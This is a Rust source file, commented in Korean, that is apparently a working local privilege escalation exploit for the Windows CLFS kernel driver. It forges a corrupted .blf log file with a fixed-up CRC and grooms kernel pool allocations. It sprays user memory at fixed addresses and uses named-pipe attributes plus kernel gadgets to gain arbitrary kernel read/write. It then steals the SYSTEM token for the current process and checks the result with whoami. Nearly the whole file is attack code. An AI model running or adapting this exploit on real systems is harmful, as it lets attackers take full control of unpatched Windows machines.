use std::ffi::{OsStr, OsString};
use std::fmt::Error;
use std::time::{SystemTime, UNIX_EPOCH};
use std::{env, io};
use std::ptr::{null, null_mut};
use std::ffi::{c_void, CString};
use std::mem::size_of;
use std::os::windows::ffi::OsStrExt;
use std::collections::HashSet;

use std::fs::OpenOptions;
use std::io::{Read, Seek, SeekFrom, Write};
use std::path::Path;

use windows_sys::Wdk::Storage::FileSystem::{FILE_DISPOSITION_INFORMATION, FILE_INFORMATION_CLASS, FSCTL_PIPE_GET_HANDLE_ATTRIBUTE, FSCTL_PIPE_SET_HANDLE_ATTRIBUTE, FileDispositionInformation};
use windows_sys::Win32::Security::{GetSidSubAuthority, GetSidSubAuthorityCount, GetTokenInformation, IsValidSid, IsWellKnownSid, PSID, SID, SecurityAnonymous, SecurityDelegation, SecurityIdentification, SecurityImpersonation, TOKEN_ADJUST_PRIVILEGES, TOKEN_ELEVATION, TOKEN_INFORMATION_CLASS, TOKEN_MANDATORY_LABEL, TOKEN_QUERY, TOKEN_TYPE, TOKEN_USER, TokenElevation, TokenImpersonation, TokenImpersonationLevel, TokenIntegrityLevel, TokenPrimary, TokenType, TokenUser, WinLocalSystemSid};
use windows_sys::Win32::Storage::FileSystem::{AddLogContainer, CreateLogFile, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_ALWAYS};
use windows_sys::Win32::System::IO::{IO_STATUS_BLOCK, IO_STATUS_BLOCK_0};
use windows_sys::Win32::System::LibraryLoader::{DONT_RESOLVE_DLL_REFERENCES, GetProcAddress, LoadLibraryExW};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, VirtualAlloc};
use windows_sys::Win32::System::Pipes::CreatePipe;
use windows_sys::Win32::System::Threading::{
    GetCurrentProcess, GetCurrentProcessId, GetCurrentThread, GetCurrentThreadId, OpenProcess, OpenProcessToken, OpenThreadToken, PROCESS_QUERY_INFORMATION, WinExec
};

use windows_sys::Win32::Foundation::{
    CloseHandle, DUPLICATE_SAME_ACCESS, DuplicateHandle, ERROR_NO_TOKEN, ERROR_SUCCESS, GENERIC_ALL, GENERIC_READ, GENERIC_WRITE, GetLastError, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS, STATUS_INFO_LENGTH_MISMATCH
};

use windows_sys::Win32::System::Registry::{
    RegCloseKey,
    RegOpenKeyExW,
    RegQueryValueExW,
    HKEY,
    HKEY_LOCAL_MACHINE,
    KEY_READ,
    REG_SZ,
};

use std::mem::offset_of;

mod ntdll;
mod helper;
mod exploit;

use exploit::kernel_gadget::{
    KernelGadget,
    KernelWriteSource,
};


use ntdll::system_infomation::{
    big_pool::{
        SystemBigPoolEntry,
        SystemBigPoolInformation
    },
    class::SystemInformationClass,
    system_handle::{
        SystemHandleInformation,
        SystemHandleTableEntryInfo,
        SystemHandleInformationEx,
        SystemHandleTableEntryInfoEx
    },
    rtl_process::{
        RtlProcessModuleInformation,
        RtlProcessModules
    },
};

use ntdll::extern_raw::{
    NtFsControlFile,
    NtSetInformationFile,
    NtQuerySystemInformation
};

use ntdll::pipeline::{PipeAttribute, ListEntry};
use helper::{str_helper, nt_helper};

#[derive(Debug)]
struct LogPaths {
    // LOG:C:\Users\Public\MyLog
    trigger_log: OsString,
    // C:\Users\Public\MyLog.blf
    trigger_blf: OsString,
    // LOG:C:\Users\Public\MyLxg
    secondary_log_prefix: OsString,
    // C:\Users\Public\.container_1XXXX
    container_first_try: OsString,
    container_second_try: OsString,
}

//힙 그루밍
#[derive(Default)]
struct ClfsPools {
    seen: HashSet<usize>,
    addresses: Vec<usize>,
}

impl ClfsPools {
    fn new() -> Self {
        Self::default()
    }

    fn push_if_new(&mut self, address: usize) -> bool {
        if self.seen.insert(address) {
            self.addresses.push(address);
            true
        } else {
            false
        }
    }
}

//
struct GroomingRes{
    log_handle: HANDLE,
    distance: usize
}

//공유되는 변수
struct ProcessTable{
    hprocess: HANDLE,
    eprocess: usize,
    system_eprocess: usize
}


//token 오프셋만 반환하는 형태로
fn get_os_version() -> Result< usize, u32> {
    let path = str_helper::wide(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
    let value_name = str_helper::wide("CurrentBuild");

    let mut hkey: HKEY = null_mut();

    let status = unsafe {
        RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            path.as_ptr(),
            0,
            KEY_READ,
            &mut hkey,
        )
    };

    if status != ERROR_SUCCESS {
        eprintln!("[!] Failed to open registry key: {status}");
        return Err(status);
    }

    println!("[+] Registry key opened successfully");

    let mut value_type: u32 = 0;
    let mut buffer = [0u16; 64];
    let mut buffer_size =
        (buffer.len() * size_of::<u16>()) as u32;

    let status = unsafe {
        RegQueryValueExW(
            hkey,
            value_name.as_ptr(),
            null(),
            &mut value_type,
            buffer.as_mut_ptr().cast::<u8>(),
            &mut buffer_size,
        )
    };

    unsafe {
        RegCloseKey(hkey);
    }

    if status != ERROR_SUCCESS {
        eprintln!("[!] Failed to query CurrentBuild: {status}");
        return Err(status);
    }

    if value_type != REG_SZ {
        eprintln!("[!] Unexpected registry value type: {value_type}");
        return Err(13);
    }

    let wchar_len = buffer_size as usize / size_of::<u16>();

    let end = buffer[..wchar_len.min(buffer.len())]
        .iter()
        .position(|&c| c == 0)
        .unwrap_or(wchar_len.min(buffer.len()));

    let build_string =
        String::from_utf16_lossy(&buffer[..end]);

    let winversion: u32 =
        build_string.parse().map_err(|_| 13u32)?;

    println!("[+] Windows Build Number: {winversion}");

    let token_offset =
        if (17763..=22000).contains(&winversion) {
            0x4b8
        } else {
            eprintln!("[!] Version {winversion} not supported.");
            0
        };

    Ok( token_offset )
}

fn get_object_kernel_address(object: HANDLE) -> Option<usize> {
    let object_value = object as usize;

    // 원본 PoC의 특수 처리:
    // handle == 4이면 SYSTEM(PID 4)의 handle 4를 찾는다.
    let target_pid = if object_value == 4 {
        4usize
    } else {
        unsafe { GetCurrentProcessId() as usize }
    };

    let mut buffer_size = 0x1000usize;

    loop {
        let mut buffer = vec![0u8; buffer_size];
        let mut return_length = 0u32;

        let status = unsafe {
            NtQuerySystemInformation(
                SystemInformationClass::SystemExtendedHandleInformation,
                buffer.as_mut_ptr().cast(),
                buffer.len() as u32,
                &mut return_length,
            )
        };

        if status == STATUS_INFO_LENGTH_MISMATCH {
            buffer_size = return_length as usize + 0x100;
            continue;
        }

        if !nt_helper::nt_success(status) {
            return None;
        }

        let info =
            unsafe { &*(buffer.as_ptr() as *const SystemHandleInformationEx) };

        let entries = unsafe {
            buffer
                .as_ptr()
                .add(size_of::<SystemHandleInformationEx>())
                as *const SystemHandleTableEntryInfoEx
        };

        for i in 0..info.number_of_handles {
            let entry = unsafe { &*entries.add(i) };

            if entry.unique_process_id == target_pid
                && entry.handle_value == object_value
            {
                return Some(entry.object as usize);
            }
        }

        return None;
    }
}


fn init_environment(pt: &mut ProcessTable){
    let ok = unsafe {
        //현재 프로세스 pseudo handle을, 현재 프로세스의 핸들 테이블에 실제 핸들로 만들어서 hProcess에 저장한다
        DuplicateHandle(
            GetCurrentProcess(), //테이블 지정
            GetCurrentProcess(), //복제 대상
            GetCurrentProcess(), //새 핸들을 넣을 테이블
            &mut pt.hprocess,
            0,
            0, // FALSE
            DUPLICATE_SAME_ACCESS, //중복 핸들은 원본 핸들과 동일한 액세스 권한을 가짐 -> 원본핸들 유지
        )
    };

    pt.eprocess =
    get_object_kernel_address(pt.hprocess)
        .expect("failed to find current EPROCESS");
    pt.system_eprocess =
        get_object_kernel_address(4usize as HANDLE)
            .expect("failed to find SYSTEM EPROCESS");
}


//직접적으로 연관이 있지 않고 단순히 현재 프로세스에 토큰이 유요한가 검사하는 코드입니다.
fn check_access_token(pt: &mut ProcessTable) {
    let current_pid = unsafe { GetCurrentProcessId() };
    let mut token_handle: HANDLE = null_mut();

    pt.hprocess = unsafe {
        OpenProcess(
            PROCESS_QUERY_INFORMATION,
            0,
            current_pid,
        )
    };

    if pt.hprocess.is_null() {
        println!("[!] OpenProcess failed");
        return;
    }

    let ok = unsafe {
        OpenProcessToken(
            pt.hprocess,
            TOKEN_ADJUST_PRIVILEGES,
            &mut token_handle,
        )
    };

    if ok == 0 {
        println!("[!] OpenProcessToken failed");
        return;
    }

    let mut buffer_size = 0x1000usize;

    let buffer = loop {
        let word_count =
            (buffer_size + size_of::<usize>() - 1)
            / size_of::<usize>();

        let mut buffer = vec![0usize; word_count];

        let actual_size =
            buffer.len() * size_of::<usize>();

        let mut required_size = 0u32;

        let status = unsafe {
            NtQuerySystemInformation(
                SystemInformationClass::SystemHandleInformation,
                buffer.as_mut_ptr().cast::<c_void>(),
                actual_size.try_into().unwrap(),
                &mut required_size,
            )
        };

        if status == STATUS_INFO_LENGTH_MISMATCH {
            buffer_size = required_size as usize + 0x1000;
            continue;
        }

        if !nt_helper::nt_success(status) {
            println!(
                "[!] NtQuerySystemInformation failed: {:#x}",
                status as u32
            );
            return;
        }

        break buffer;
    };

    let info = unsafe {
        &*(buffer.as_ptr() as *const SystemHandleInformation)
    };

    let current_pid = current_pid as u16;
    let token_handle_value = token_handle as usize as u16;

    for i in 0..info.number_of_handles as usize {
        let entry = unsafe {
            &*info.handles.as_ptr().add(i)
        };

        if entry.unique_process_id == current_pid
            && entry.object_type_index == 5
            && entry.handle_value == token_handle_value
        {
            println!("found token handle");
            break;
        }
    }
}


//정상 blf파일을 생성한다, 코드의
fn create_initial_log_file() -> io::Result<LogPaths> {
    let public = env::var_os("PUBLIC")
        .ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::NotFound,
                "PUBLIC environment variable not found",
            )
        })?;

    println!("[+] PUBLIC = {}", public.to_string_lossy());

    // LOG:C:\Users\Public
    let mut log_root = OsString::from("LOG:");
    log_root.push(&public);

    let log_name = str_helper::append(&log_root, r"\MyLog");
    let log_file = str_helper::append(&public, r"\MyLog.blf");
    let xlog_name = str_helper::append(&log_root, r"\MyLxg");

    let id = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .subsec_nanos();
    

    let frist_container = str_helper::append(&public, &format!(r"\.container_1{id}"));
    let second_container = str_helper::append(&public, &format!(r"\.container_1{}", id.wrapping_add(1)));

    println!("[+] Container id: {id}");

    let log_name_w = str_helper::osstr_wide(&log_name);

    let log_handle = unsafe {
        CreateLogFile(
            log_name_w.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_ALWAYS,
            0,
        )
    };

    if log_handle == INVALID_HANDLE_VALUE {
        return Err(io::Error::last_os_error());
    }

    println!("[+] Log file created: {log_handle:p}");

    unsafe {
        CloseHandle(log_handle);
    }

    Ok(LogPaths {
        trigger_log: log_name,
        trigger_blf: log_file,
        secondary_log_prefix: xlog_name,
        container_first_try: frist_container,
        container_second_try: second_container
    })
}

fn get_big_pool_info(clfs_pools: &mut ClfsPools){
    let mut buffer_size: u32 = 0;
    let bigpool_buffer = nt_helper::nt_system_big_pool_infomation_helper();

    if let Ok(bigpool_buffer) = bigpool_buffer {
        let info = unsafe {
            &*(bigpool_buffer.as_ptr() as *const SystemBigPoolInformation)
        };

        //bigpool_buffer을 순회하면서 원하는 문자열을 찾고, 기존에 등록되지 않았을 경우 push
        for i in (0..info.count as usize).rev() {
            let entry = unsafe {
                &*info.entries.as_ptr().add(i)
            };
            if entry.tag() == b"Clfs" && entry.size_in_bytes == 0x7a00 {
                let res = clfs_pools.push_if_new(entry.virtual_address());
            }
        }
    }
}

fn get_offset_between_pool(logpath: &LogPaths) -> Option<GroomingRes>{
    //메모리 해제를 하지 않으므로 unsafe 하다.
    let mut clfs_pool = ClfsPools::new();

    //객체간 거리 안정도
    let mut distance_stability = 0;
    let mut pool_size = 0;
    let mut name_cnt = 0;

    let mut grooming_res = GroomingRes{
        log_handle: null_mut(),
        distance: 0
    };


    const DELETE_ACCESS: u32 = 0x0001_0000;
    loop{
        let new_log_name = str_helper::append(&logpath.trigger_log, &format!(r"{name_cnt}"));
        let log_name_w = str_helper::osstr_wide(&new_log_name);
        grooming_res.log_handle = unsafe {
            CreateLogFile(
                log_name_w.as_ptr(),
                GENERIC_READ | GENERIC_WRITE | DELETE_ACCESS,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                null_mut(),
                OPEN_ALWAYS,
                0,
            )
        };

        if grooming_res.log_handle == INVALID_HANDLE_VALUE {
            let error = unsafe { GetLastError() };

            eprintln!(
                "[!] CreateLogFile failed: error={error}"
            );
            continue;
        }

        //기존 핸들이 존재할경우 추가로직
        get_big_pool_info(&mut clfs_pool);
        pool_size = clfs_pool.addresses.len();
        if pool_size >= 3 {

            let third_to_last = clfs_pool.addresses[pool_size - 3];
            let second_to_last = clfs_pool.addresses[pool_size - 2];
            let last = clfs_pool.addresses[pool_size - 1];

            let distance1 = third_to_last.abs_diff(second_to_last);
            let distance2 = second_to_last.abs_diff(last);

            if distance1 == distance2 && last > second_to_last {
                distance_stability += 1;
                grooming_res.distance = distance2;
                println!("[+] Stable distance: {distance2:#x}");
            } else {
                distance_stability = 0;
            }
        }
        name_cnt += 1;

        if distance_stability > 6 {
            break;
        }
    }

    Some(grooming_res)
}


fn crc32(data: &[u8]) -> u32 {
    let mut crc = 0xffff_ffffu32;

    for &byte in data {
        crc ^= byte as u32;

        for _ in 0..8 {
            crc = if crc & 1 != 0 {
                0xedb8_8320 ^ (crc >> 1)
            } else {
                crc >> 1
            };
        }
    }

    crc ^ 0xffff_ffff
}

fn crc_calculator_and_fix(path: impl AsRef<Path>) -> io::Result<u32> {
    const BLOCK_OFFSET: u64 = 0x800;
    const CHECKSUM_OFFSET: usize = 0x0c;
    const SECTOR_SIZE: usize = 512;
    const MAX_BLOCK_SIZE: usize = 0x10_0000;

    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .open(path)?;

    // CLFS_LOG_BLOCK_HEADER.TotalSectorCount
    // Base Block + 0x04
    file.seek(SeekFrom::Start(BLOCK_OFFSET + 0x04))?;

    let mut sector_count_bytes = [0u8; 2];
    file.read_exact(&mut sector_count_bytes)?;

    let total_sectors =
        u16::from_le_bytes(sector_count_bytes) as usize;

    let block_size = total_sectors
        .checked_mul(SECTOR_SIZE)
        .ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::InvalidData,
                "CLFS block size overflow",
            )
        })?;

    if block_size == 0 || block_size > MAX_BLOCK_SIZE {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!("invalid CLFS block size: {block_size:#x}"),
        ));
    }

    println!(
        "[*] TotalSectorCount: {total_sectors}, block size: {block_size:#x}"
    );

    // 실제 Base Block 전체 읽기
    let mut block = vec![0u8; block_size];

    file.seek(SeekFrom::Start(BLOCK_OFFSET))?;
    file.read_exact(&mut block)?;

    // 최소한 checksum 필드까지는 존재해야 함.
    if block.len() < CHECKSUM_OFFSET + 4 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "CLFS block too small for checksum field",
        ));
    }

    let stored_checksum = u32::from_le_bytes(
        block[CHECKSUM_OFFSET..CHECKSUM_OFFSET + 4]
            .try_into()
            .unwrap(),
    );

    println!("[*] Stored checksum: {stored_checksum:#010x}");

    // checksum 계산 시 checksum 필드 자체는 0으로 만든다.
    block[CHECKSUM_OFFSET..CHECKSUM_OFFSET + 4].fill(0);

    let calculated_checksum = crc32(&block);

    println!(
        "[*] Calculated checksum: {calculated_checksum:#010x}"
    );

    if stored_checksum == calculated_checksum {
        println!("[=] Checksum already correct");
        return Ok(calculated_checksum);
    }

    // 실제 파일 위치:
    // Base Block 0x800 + Checksum 0x0c = 0x80c
    file.seek(SeekFrom::Start(
        BLOCK_OFFSET + CHECKSUM_OFFSET as u64,
    ))?;

    file.write_all(&calculated_checksum.to_le_bytes())?;
    file.flush()?;

    println!(
        "[+] Checksum fixed at {:#x}: {calculated_checksum:#010x}",
        BLOCK_OFFSET + CHECKSUM_OFFSET as u64
    );

    Ok(calculated_checksum)
}

fn create_file(logpath: &LogPaths, distance: usize) -> std::io::Result<()> {
    fn le32(value: u32) -> [u8; 4] {
        value.to_le_bytes()
    }
    fn le32_u8(value: u32, tail: u8) -> [u8; 5] {
        let [a, b, c, d] = value.to_le_bytes();
        [a, b, c, d, tail]
    }

    //나중에 체크섬 계산을 위해
    let checksum = le32(0x0000_0000);

    let signature_offset = le32(0x0000_0050);
    let cb_symbol_zone = le32(distance as u32 + 0x0014b); //pcotainer 손상
    // let cb_symbol_zone = le32(0x1115B); //pcotainer 손상
    // FF FF xx xx xx xx xx xx -> 00 00 00 00 00 xx xx xx 형태로 손상시킴 -> 낮은 주소를 가르킨다.
    // 손상된 바이트는 0x?????0 형태이다. 주소 증가 단위가 16바이트 단위 대역은 0x100000000

    let cc_offset_array = le32(0x0000_1b30);
    let block_name_offset = le32(0x0000_1bb8);
    let block_attribute_offset = le32(0x0000_1b30);

    let fake_client_context = le32_u8(0xc1fd_f007, 0x88);
    let fake_client_context2 = le32(0x0000_0001);
    let fake_client_context3 = le32(0x0000_0020);

    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .open(&logpath.trigger_blf)?;

    str_helper::patch(&mut file, 0x80c, &checksum)?;
    str_helper::patch(&mut file, 0x868, &signature_offset)?;
    str_helper::patch(&mut file, 0x9a8, &cc_offset_array)?;
    str_helper::patch(&mut file, 0x1b98, &cb_symbol_zone)?;
    str_helper::patch(&mut file, 0x2390, &block_name_offset)?;
    str_helper::patch(&mut file, 0x2394, &block_attribute_offset)?;
    str_helper::patch(&mut file, 0x23a0, &fake_client_context)?;
    str_helper::patch(&mut file, 0x23ab, &fake_client_context2)?;
    str_helper::patch(&mut file, 0x2418, &fake_client_context3)?;
    Ok(())
}

fn heap_spray(){
    let alloc00: usize = 0x5000000;
    let alloc01: usize = 0x10000;

    let ok = unsafe{
        VirtualAlloc(
            alloc00 as *mut c_void, 
            0x100000, 
             MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )
    };

    if ok.is_null() {
        println!("VirtualAlloc failed");
        return 
    }

    let spray_size: usize = 0x1000000;

    let ok2 = unsafe {
        VirtualAlloc(
            alloc01 as *mut c_void, 
            spray_size, 
             MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )
    };

    if ok2.is_null() {
        println!("VirtualAlloc2 failed");
        return 
    }

    for i in (0..spray_size).step_by(0x10) {
        unsafe {
            *((alloc01 + i) as *mut u64) = alloc00 as u64;
        }
    }
}

fn pipe_arbitrary_write_values(h_pipe: &mut Pipeline, system_eprocess: usize){
    const PIPE_ATTRIBUTE_INPUT_SIZE: u32 = 0xFD8;
    const PIPE_ATTRIBUTE_OUTPUT_SIZE: u32 = 0x100;

    let ok = unsafe {
        CreatePipe(
            &mut h_pipe.read_pipe,
            &mut h_pipe.write_pipe,
            std::ptr::null(),
            0x1000, // 파이프 내부 버퍼 크기
        )
    };

    if ok == 0 {
        println!("fail create pipe");
    }

    let mut iosb = IO_STATUS_BLOCK {
        Anonymous: IO_STATUS_BLOCK_0 { Pointer: null_mut() },
        Information: 0,
    };

    //공격하기 좋은값
    let mut input_buf = vec![0u8; 0x2000];
    input_buf[0] = b'Z'; // [5A 00 00 00 00 00 00 00]
    input_buf[8..8 + 0xFFE].fill(b'A');

    let mut output_buf = vec![b'B'; 0x100];

    let ok2 = unsafe {
        NtFsControlFile(
            h_pipe.write_pipe,
             null_mut(), 
             null_mut(), 
             null_mut(), 
            &mut iosb, 
            FSCTL_PIPE_SET_HANDLE_ATTRIBUTE, 
            input_buf.as_mut_ptr().cast::<c_void>(),
            PIPE_ATTRIBUTE_INPUT_SIZE, 
            output_buf.as_mut_ptr().cast::<c_void>(),
            PIPE_ATTRIBUTE_OUTPUT_SIZE
        )
    };

    if ok2 == 0 {
        println!("fail make pipe")
    }

    let bigpool_buffer = nt_helper::nt_system_big_pool_infomation_helper().expect("write_value_fail");

    let info = unsafe {
        &*(bigpool_buffer.as_ptr() as *const SystemBigPoolInformation)
    };

    let mut pipe_attribute_base: usize = 0;

    for i in (0..info.count as usize).rev() {
        let entry = unsafe {
            &*info.entries.as_ptr().add(i)
        };

        if entry.tag() == b"NpAt" {
            pipe_attribute_base = entry.virtual_address();
            //정상적으로 잡는거 확인함
            println!(
                "AttributeValue field (+0x20): {:#018x}",
                pipe_attribute_base + 0x20
            );
            println!(
                "marker destination (+0x28): {:#018x}",
                pipe_attribute_base + 0x28
            );

            // println!("Press Enter after setting WinDbg watchpoint...");
            // let mut input = String::new();
            // std::io::stdin().read_line(&mut input).unwrap();
            break;
        }
    }

    /*
        커널 메모리에는 다음과 같은 주소를 가져올수 있고
        pipe_attribute_base 는 아래 구조체의 시작점을 잡고 있습니다.
        struct PipeAttribute {
            LIST_ENTRY list;             // +0x00 ~ +0x0f
            char *AttributeName;         // +0x10 [5A 00 00 00 00 00 00 00]
            uint64_t AttributeValueSize; // +0x18
            char *AttributeValue;        // +0x20 [41 41 41 41 ...];
        };
        
    */

    let system_eprocess_page_offset = system_eprocess  & 0xFFF;
    let system_eprocess_page_base = system_eprocess & !0xFFF; //해당부분으로 대체

    const PIPE_ATTRIBUTE_MARKER: u64 = u64::from_le_bytes([
        b'Z', 0,
        b'A', b'A', b'A',
        b'A', b'A', b'A',
    ]);
    
    //fakeobject를 놔둘 위치
    let allocated = unsafe {
        VirtualAlloc(
            KernelWriteSource::BASE as *mut c_void,
            0x100000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        )
    };
    //공격을 위해 사용할 주소
    let attribute_value_size_addr = pipe_attribute_base
            + offset_of!(PipeAttribute, attribute_value_size);
    
    //유저 메모리에 똑같이 만듬
    if !allocated.is_null() {
        unsafe {
            // 0으로 정리하는 코드지만 필요 없을 가능성
            // std::ptr::write_bytes(
            //     dest3 as *mut u8,
            //     0,
            //     0xFF8,
            // );

            KernelWriteSource::set(
                system_eprocess_page_base as u64,
                PIPE_ATTRIBUTE_MARKER,
            );
        }

        //spray로 뿌리는 값은 커널 메모리의 주소임
        for offset in (8..0x1000000).step_by(0x10) {
            unsafe {
                *((0x10000 + offset) as *mut u64) =
                    attribute_value_size_addr as u64;
            }
        }

    }

}


struct ExpolitState {
    flag: i32,
    system_token: u64,
    next_token: u64,
    token_offset: u64
}

fn pipe_arbitrary_write(
    pipe : &mut Pipeline,
    log_path: &LogPaths, 
    exploit_gadget: &ExploitGadgets, 
    state: &mut ExpolitState,
    pt: &ProcessTable
){
    let mut log_handle: HANDLE = null_mut();

    //커널에 실행을 원하는 gadget을 맵핑함
    //SMEP에 의해서 유저모드 함수를 끌어오는 건 제한됨
    unsafe {
        //손상된 vatble,  rax = [rax + 0x18].q -> rax = [rax + 8].q 순서로 호출
        *((0x5000000) as *mut u64) = 0x123456789;
        *((0x5000018) as *mut u64) = exploit_gadget.clfs_earlier_lsn.kernel_addr as u64;
        *((0x5000008) as *mut u64) = exploit_gadget.se_set_access_state_generic_mapping.kernel_addr as u64;
    }

    if state.flag == 1{
        //system_eprocess가 올라간상태

        unsafe {
            KernelWriteSource::set(state.system_token, state.next_token);
        }

        //내 eprocess에 쓴다
        let token_adress = pt.eprocess as u64 + state.token_offset - 8;

        for offset in (8..0x1000000).step_by(0x10) {
            unsafe {
                *((0x10000 + offset) as *mut u64) =
                    token_adress as u64;
            }
        }

        println!("flag run");

    }

    let log_name_w = str_helper::osstr_wide(&log_path.trigger_log);

    const DELETE_ACCESS: u32 = 0x0001_0000;

    //손상된 blf가 커널에 로드
    let corrupted_log_handle = unsafe {
        CreateLogFile(
            log_name_w.as_ptr(),
            GENERIC_READ | GENERIC_WRITE | DELETE_ACCESS,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            null_mut(),
            OPEN_ALWAYS,
            0,
        )
    };


    let suffix = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos()
        % 100_000;

    let mut lxg_name = log_path.secondary_log_prefix.clone();
    lxg_name.push(format!("{suffix:05}"));
    let lxg_name_w = str_helper::osstr_wide(&lxg_name);

    //정상 blf 로드, 공격받을 blf
    let valid_log_handle = unsafe {
        CreateLogFile(
            lxg_name_w.as_ptr(),
            GENERIC_READ | GENERIC_WRITE | DELETE_ACCESS,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            null_mut(),
            OPEN_ALWAYS,
            0,
        )
    };

    //정상 컨테이너 생성
    let mut pcb_container: u64 = 512;

    let container_path = if state.flag == 0 {
        &log_path.container_first_try
    } else {
        &log_path.container_second_try
    };

    let container_path_wide: Vec<u16> = str_helper::osstr_wide(container_path);
    
    let result = unsafe {
        AddLogContainer(
            valid_log_handle,
            &mut pcb_container,
            container_path_wide.as_ptr(),
            null_mut(),
        )
    };

    if result == 0 {
        println!("AddLogContainer failed");
        return
    }

    pcb_container = 512;
    let pin_container = str_helper::osstr_wide(&log_path.container_first_try);

    //손상 컨테이너 생성 -> 이번 cve에 한정된 rootcause
    //일반적으로 경로 재활용을 하지 않음
    unsafe {
        AddLogContainer(
            corrupted_log_handle,
            &mut pcb_container,
            pin_container.as_ptr(),
            null_mut(),
        )
    };

    let mut iosb = IO_STATUS_BLOCK {
        Anonymous: IO_STATUS_BLOCK_0 { Pointer: null_mut() },
        Information: 0,
    };

    let disposition = FILE_DISPOSITION_INFORMATION {
        DeleteFile: true,
    };

    let status = unsafe {
        NtSetInformationFile(
            valid_log_handle,
            &mut iosb,
            (&disposition as *const FILE_DISPOSITION_INFORMATION).cast(),
        std::mem::size_of::<FILE_DISPOSITION_INFORMATION>() as u32,
        FileDispositionInformation,
        )
    };

    println!("NtSetInformationFile: {}",status);

    //트리거 -> 커널 메모리에 쓰기 발생
    unsafe {
        CloseHandle(valid_log_handle);
        CloseHandle(corrupted_log_handle);
    }

    let mut output = vec![0u8; 0x2000];

    // C의 int v29 = 90; + input length 2
    // 실제 전달되는 바이트는 "Z\0"
    let mut attribute_name = [b'Z', 0];

    let status = unsafe {
        NtFsControlFile(
            pipe.write_pipe,                     // 원본 hReadPipe[0]
            null_mut(),
            null_mut(),
            std::ptr::null_mut(),
            &mut iosb,
            FSCTL_PIPE_GET_HANDLE_ATTRIBUTE,
            attribute_name.as_mut_ptr().cast::<c_void>(),
            attribute_name.len() as u32,
            output.as_mut_ptr().cast::<c_void>(),
            output.len() as u32,
        )
    };

    if status < 0 {
        panic!("NtFsControlFile failed: {status:#x}");
    }

    // 원본:
    // (char*)v9b + v14 + 0x4b8
    let system_eprocess_page_offset = pt.system_eprocess & 0xFFF;
    let token_offset = system_eprocess_page_offset as usize + 0x4b8;

    if token_offset + 16 > output.len() {
        panic!("Token offset outside returned buffer");
    }

    let system_token_value = u64::from_le_bytes(
        output[token_offset..token_offset + 8]
            .try_into()
            .unwrap(),
    );

    let next_token = u64::from_le_bytes(
        output[token_offset + 8..token_offset + 16]
            .try_into()
            .unwrap(),
    );

    state.system_token = system_token_value;
    state.next_token = next_token;

    println!("token: {}", system_token_value);
    println!("next_token: {}", next_token);

    state.flag += 1;
}

struct Pipeline {
    read_pipe: HANDLE,
    write_pipe: HANDLE
}


pub struct ExploitGadgets {
    clfs_earlier_lsn: KernelGadget,
    se_set_access_state_generic_mapping: KernelGadget,
}


fn main() {
    let mut pt = ProcessTable{
        hprocess: null_mut(),
        eprocess: 0,
        system_eprocess: 0
    };

    let token_offset_res = get_os_version();

    init_environment(&mut pt);
    check_access_token(&mut pt);
    
    //정상로그파일 생성
    let log_paths =
        create_initial_log_file()
            .expect("failed to create initial CLFS log");
    println!("gromming start");
    let gres_opt = get_offset_between_pool(&log_paths);

    println!("gromming end");

    if let Some(gres) = gres_opt{
        let res = create_file(&log_paths, gres.distance);
        let res2 = crc_calculator_and_fix(&log_paths.trigger_blf);

        heap_spray();

        let mut h_read_pipe =  Pipeline{
            read_pipe: std::ptr::null_mut(),
            write_pipe: std::ptr::null_mut(),
        };

        /*
            RDX = 0x00000000FFFFFFFF가 되는 사이드 이펙트
        */
        let clfs_earlier_lsn = KernelGadget::new(
            r"C:\Windows\System32\drivers\CLFS.SYS", 
            b"ClfsEarlierLsn\0",
        );

        /*
            [RDX]의 16바이트를 [[RCX+0x48]+8]에 복사하는 16-byte write gadget
        */
        let se_set_access = KernelGadget::new(
            r"C:\Windows\System32\ntoskrnl.exe", 
            b"SeSetAccessStateGenericMapping\0",
        );

        match (clfs_earlier_lsn, se_set_access) {
            (Some(clfs_earlier_lsn), Some(se_set_access)) =>{
                let exploit_gadget = ExploitGadgets{
                    clfs_earlier_lsn: clfs_earlier_lsn,
                    se_set_access_state_generic_mapping: se_set_access
                };

                println!("start exploit");

                let mut state = ExpolitState { 
                    flag: 0 , system_token: 0, next_token: 0, token_offset: 0x4b8 };
                
                pipe_arbitrary_write_values(&mut h_read_pipe, pt.system_eprocess);
                println!("start write");
                pipe_arbitrary_write(
                    &mut h_read_pipe, &log_paths, &exploit_gadget, &mut state, &pt
                );

                println!("start lpe");
                pipe_arbitrary_write(
                    &mut h_read_pipe, &log_paths, &exploit_gadget, &mut state, &pt
                );

                use std::process::Command;

                let status = Command::new("whoami")
                    .status()
                    .expect("failed to execute whoami");
            },
            (None, Some(se_set_access)) => {
                 println!("cl none");
            },
            (Some(clfs_earlier_lsn), None) => {
                println!("ce none");
            }
            _ => {
                println!("cl, se none");
            }
        }
    }
}